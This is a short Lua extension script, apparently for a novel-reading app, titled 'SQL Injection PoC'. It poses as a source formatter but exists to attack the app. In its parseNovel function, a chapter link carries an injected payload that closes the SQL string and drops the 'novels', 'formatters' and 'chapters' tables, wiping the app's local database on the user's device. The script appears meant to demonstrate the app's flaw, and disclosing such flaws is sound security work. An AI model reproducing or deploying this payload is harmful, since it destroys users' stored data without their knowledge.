-- {"id":1337,"version":"1.0.0","author":"TechnoJo4","repo":""}

local settings = {}

local x = "http://technojo4.com"
local y = "SQL Injection PoC"
return {
    id = 1337,
    name = y,
    baseURL = x,
    imageURL = "",
    hasSearch = false,
    listings = {
        Listing(y, false, function()
            local n = Novel()
            n:setLink(x)
            n:setTitle(y)
            return {n}
        end)
    },

    -- Default functions that had to be set
    getPassage = function()return ""end,
    parseNovel = function()
        local n = NovelInfo()
        n:setTitle(y)
        local c = NovelChapter()
        c:setTitle(y)
        c:setLink(x.."'); DROP TABLE IF EXISTS 'novels'; DROP TABLE IF EXISTS 'formatters'; DROP TABLE IF EXISTS 'chapters';  --")
        n:setChapters(AsList({ c }))
        return NovelInfo()
    end,
    search = function() end,
    setSettings = function() end
}
